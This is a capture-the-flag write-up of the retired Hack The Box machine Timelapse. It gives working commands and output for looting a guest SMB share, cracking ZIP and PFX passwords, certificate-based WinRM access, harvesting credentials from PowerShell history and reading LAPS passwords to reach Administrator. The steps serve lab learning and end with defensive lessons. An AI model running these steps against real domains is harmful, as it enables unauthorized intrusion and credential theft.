---
title: "Hack The Box — Timelapse"
summary: "Timelapse exposes a guest-readable SMB backup; cracking its ZIP and PFX enables certificate WinRM, while PowerShell history and LAPS lead to Administrator."
platform: "Hack The Box"
contentType: "machine"
publicationPolicy: "retired"
difficulty: "Easy"
os: "Windows"
solvedAt: 2026-10-04
publishedAt: 2026-10-04
tags:
  - active-directory
  - smb
  - password-cracking
  - pfx
  - certificate-authentication
  - winrm
  - powershell-history
  - laps
  - privilege-escalation
tools:
  - Nmap
  - smbclient
  - John the Ripper
  - 7-Zip
  - OpenSSL
  - Evil-WinRM
  - NetExec
  - PowerShell
cves: []
htbUrl: "https://app.hackthebox.com/machines/Timelapse"
cover: "/images/writeups/hackthebox/machines/timelapse/timelapse.png"
coverAlt: "Hack The Box Timelapse machine logo showing a stylized clock inside a green circle"
featured: false
draft: false
---

> This write-up documents an authorized Hack The Box lab. The [official Timelapse listing](https://www.hackthebox.com/machines/timelapse) identifies it as a **Retired Machine**. Flag values, personal identifiers, and VPN details are omitted. The fixed credentials shown below belong to this retired lab; the rotating LAPS password is represented by a placeholder.

## Executive summary

Timelapse is a Windows Active Directory domain controller with a guest-readable SMB share. A backup ZIP in that share contains a password-protected PFX file. Cracking both passwords gives a client certificate and private key that authenticate to WinRM as `legacyy`. The user's PowerShell history exposes credentials for `svc_deploy`. That account can read the legacy LAPS password stored on the `DC01` computer object, and the recovered password opens a WinRM session as `Administrator`. The chain depends on exposed backup material, weak archive passwords, a credential left in shell history, and overly broad access to LAPS data.

## Target information

| Item | Value |
| --- | --- |
| Target | Timelapse (`DC01`) |
| Domain | `timelapse.htb` |
| Platform | Hack The Box |
| Difficulty | Easy |
| Operating system | Windows |
| Publication policy | Retired, confirmed by the [official machine listing](https://www.hackthebox.com/machines/timelapse) |
| Solved | 4 October 2026 |
| Main weaknesses | Guest-readable SMB backup, crackable ZIP and PFX passwords, plaintext credentials in PowerShell history, readable LAPS password |

HTB assigns a target IP to each lab session. Set the address shown in your own machine panel:

```bash
export TARGET_IP='<YOUR_HTB_TARGET_IP>'
```

## Enumeration

I scanned all TCP ports with Nmap service detection and default scripts:

```bash
nmap "$TARGET_IP" -T5 -sVC -p-
```

The scan identified `DC01` as an Active Directory domain controller. These were the ports that shaped the attack path:

```text
53/tcp    open  domain
88/tcp    open  kerberos-sec
389/tcp   open  ldap       (Domain: timelapse.htb)
445/tcp   open  microsoft-ds
636/tcp   open  ldapssl
5986/tcp  open  ssl/wsmans (certificate CN: dc01.timelapse.htb)
```

Ports 135, 139, 464, 593, 3268, 3269, 9389 and several dynamic RPC ports were also open. SMB on 445 offered a route to shared files, while WinRM over HTTPS on 5986 became useful once credentials or a certificate were available.

### SMB share access

An empty username did not list shares:

```bash
smbclient -L "//$TARGET_IP" -U '' -N
```

The output showed a blank share table, followed by an SMB1 *workgroup listing* error. That error concerned the legacy workgroup lookup; it did not establish that modern SMB access was unavailable. I retried with the guest account and an empty password:

```bash
smbclient -L "//$TARGET_IP" -U 'guest%'
```

```text
Sharename  Type
---------  ----
ADMIN$     Disk
C$         Disk
IPC$       IPC
NETLOGON   Disk
Shares     Disk
SYSVOL     Disk
```

The `Shares` share was accessible as guest. Inside it, `Dev` contained the backup and `HelpDesk` contained LAPS installation and documentation files:

```bash
smbclient "//$TARGET_IP/Shares" -U 'guest%'
```

```text
smb: \> ls
  Dev
  HelpDesk
smb: \> cd Dev
smb: \Dev\> ls
  winrm_backup.zip
smb: \Dev\> get winrm_backup.zip
smb: \Dev\> exit
```

The `HelpDesk` folder contained `LAPS.x64.msi` and LAPS documentation. Those files were a clue for later privilege escalation; the backup ZIP was the immediate lead.

### Findings

| Evidence | Why it mattered |
| --- | --- |
| Guest could read `Shares\Dev\winrm_backup.zip` | An unauthenticated user could obtain authentication material. |
| ZIP contained `legacyy_dev_auth.pfx` | The filename suggested a developer client certificate for `legacyy`. |
| WinRM listened on 5986 | Certificate-based authentication could be tried over HTTPS. |
| `HelpDesk` contained LAPS files | LAPS was worth investigating after obtaining domain credentials. |

## Initial access

### Cracking the ZIP password

I converted the encrypted ZIP into a John the Ripper input file, then used Kali's `rockyou.txt` wordlist:

```bash
zip2john winrm_backup.zip > winrm_backup.hash
john --wordlist=/usr/share/wordlists/rockyou.txt winrm_backup.hash
john --show winrm_backup.hash
```

John recovered `supremelegacy`. This password protects the ZIP, not the PFX inside it. I extracted the archive with 7-Zip and entered that password at the prompt:

```bash
7z x winrm_backup.zip
```

The result was `legacyy_dev_auth.pfx`. A PFX, or PKCS#12, can bundle a certificate and its private key. This one had its own password:

```bash
pfx2john legacyy_dev_auth.pfx > legacyy_dev_auth.hash
john --wordlist=/usr/share/wordlists/rockyou.txt legacyy_dev_auth.hash
john --show legacyy_dev_auth.hash
```

John recovered the PFX password `thuglegacy`. The two separate `*2john` conversions are important: cracking the ZIP does not decrypt the PFX.

### Extracting the certificate and connecting to WinRM

OpenSSL extracted the client certificate and private key into separate PEM files. Both commands prompted for `thuglegacy`:

```bash
openssl pkcs12 -legacy -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.pem
openssl pkcs12 -legacy -in legacyy_dev_auth.pfx -nocerts -noenc -out key.pem
chmod 600 key.pem
openssl x509 -in cert.pem -noout -subject
```

```text
subject=CN=Legacyy
```

On modern OpenSSL, `-legacy` permits parsing older PKCS#12 encryption, and `-noenc` leaves the extracted private key unencrypted so the WinRM client can use it. The subject confirmed the `legacyy` identity. I connected over the HTTPS listener found by Nmap:

```bash
evil-winrm -i "$TARGET_IP" -S -P 5986 -u legacyy -c cert.pem -k key.pem
```

```text
Info: Connection successful
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
```

The user flag was on `C:\Users\legacyy\Desktop\user.txt`; its value is omitted.

### PowerShell history exposes another account

The `legacyy` profile had a PowerShell PSReadLine history file:

```powershell
Get-Content (Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt')
```

Among previous commands, it recorded a plaintext password and a credential object for `svc_deploy`:

```powershell
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
```

`SecureString` did not protect the secret here: the original plaintext remained in the command history. From a new Kali terminal, the recovered password authenticated to WinRM as `svc_deploy`:

```bash
evil-winrm -i "$TARGET_IP" -S -P 5986 \
  -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'
```

The single quotes matter in Bash because the password contains `$`.

## Privilege escalation

### Reading the LAPS password

The [official Timelapse description](https://www.hackthebox.com/machines/timelapse) identifies `svc_deploy` as a member of `LAPS_Readers`. Group names alone do not grant universal LAPS access: the relevant permission is the ability to read the password attribute on a computer object. In this lab, `svc_deploy` could read it on `DC01`.

From the `svc_deploy` PowerShell session, group membership can be inspected with:

```powershell
whoami /groups | Select-String 'LAPS_Readers'
```

I validated the account's credentials over SMB, then used NetExec's LDAP `laps` module to retrieve readable LAPS passwords:

```bash
nxc smb "$TARGET_IP" -d timelapse.htb \
  -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'

nxc ldap "$TARGET_IP" -d timelapse.htb \
  -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -M laps
```

```text
SMB   ... [+] timelapse.htb\svc_deploy:...
LDAP  ... [+] timelapse.htb\svc_deploy:...
LAPS  ... Computer:DC01$ User: Password:<LAPS_PASSWORD>
```

This machine uses the legacy LAPS attribute `ms-Mcs-AdmPwd`. The `User:` field in NetExec's output was blank, so the output by itself did not prove which account used the password. Authentication as `Administrator` in the next step confirmed the mapping in this lab. LAPS passwords rotate, so obtain the current value from your own session rather than copying one from a write-up.

### Administrator WinRM session

I opened a new WinRM connection using the LAPS password. Reading it into a Bash variable avoids special-character problems:

```bash
read -rsp 'LAPS password: ' LAPS_PASSWORD; echo
evil-winrm -i "$TARGET_IP" -S -P 5986 \
  -u Administrator -p "$LAPS_PASSWORD"
```

```text
Info: Connection successful
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
```

The Administrator desktop was empty. Searching the user profiles located the root flag under `TRX`:

```powershell
Get-ChildItem C:\Users -Recurse -Force -Filter root.txt -ErrorAction SilentlyContinue |
    Select-Object -ExpandProperty FullName
```

```text
C:\Users\TRX\Desktop\root.txt
```

The file was readable from the Administrator session; its value is omitted. Finding the flag in another user's profile is why checking only `C:\Users\Administrator\Desktop` would miss it.

## What did not work

- A blank SMB username returned no shares. Using `guest` with an empty password exposed `Shares`. The subsequent SMB1 workgroup error did not invalidate the SMB share listing.
- Evil-WinRM 4.1 initially failed on password authentication with a Ruby `NameError` in NTLM session crypto. This was a local `rubyntlm` 0.6.7 bug, not a rejected password. Installing the fixed 0.6.8 gem for the Kali user resolved it:

  ```text
  NameError: uninitialized constant Net::NTLM::Client::SessionCrypto::CLIENT_TO_SERVER_SEALING
  ```

  ```bash
  ruby -rrubyntlm -e 's=Gem.loaded_specs.fetch("rubyntlm"); puts s.version'
  gem install --user-install rubyntlm -v 0.6.8
  ```

- Searching for `root.txt` as `svc_deploy` returned nothing because that account could not read the relevant profile. A new Administrator session was required. In PowerShell, `dir -Force` shows hidden items; `dir /a` is `cmd.exe` syntax.

## Attack path

1. Nmap identified a domain controller with SMB, LDAP and HTTPS WinRM.
2. Guest SMB access exposed `Shares\Dev\winrm_backup.zip`.
3. John recovered the ZIP password and then the password of its contained PFX.
4. The PFX certificate and key authenticated to WinRM as `legacyy`.
5. `legacyy`'s PowerShell history disclosed the `svc_deploy` password.
6. `svc_deploy` read `DC01`'s LAPS password through LDAP.
7. That password authenticated to WinRM as `Administrator`, who could read the root flag in the `TRX` profile.

## Lessons learned

- Test guest SMB access separately from an empty-username login. A blank share list is not conclusive when another low-privilege identity is available.
- Treat archived certificates and private keys as credentials. A password-protected PFX is still exploitable if its password is weak and the file is publicly readable.
- Avoid entering plaintext passwords into a command that PSReadLine may save. Clear exposed history and rotate any credential found there.
- Grant LAPS read permissions only to accounts that need them, audit access to the password attribute, and review which computer objects each delegated group can query.
- When a tool reports a local exception, check its dependency version before assuming the target rejected valid credentials.

## References

- [Hack The Box — Timelapse (official Retired machine listing)](https://www.hackthebox.com/machines/timelapse)
- [Samba `smbclient` manual](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
- [John the Ripper ZIP guide](https://github.com/openwall/john/blob/bleeding-jumbo/doc/README-ZIP) and [`pfx2john` source](https://github.com/openwall/john/blob/bleeding-jumbo/run/pfx2john.py)
- [OpenSSL `pkcs12` options](https://docs.openssl.org/3.3/man1/openssl-pkcs12/)
- [Evil-WinRM usage](https://github.com/Hackplayers/evil-winrm/blob/master/README.md)
- [Microsoft: legacy LAPS password attribute](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-legacy)
- [NetExec LDAP `laps` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/laps.py)
- [`rubyntlm` changelog for the 0.6.8 fix](https://github.com/WinRb/rubyntlm/blob/main/CHANGELOG.md)
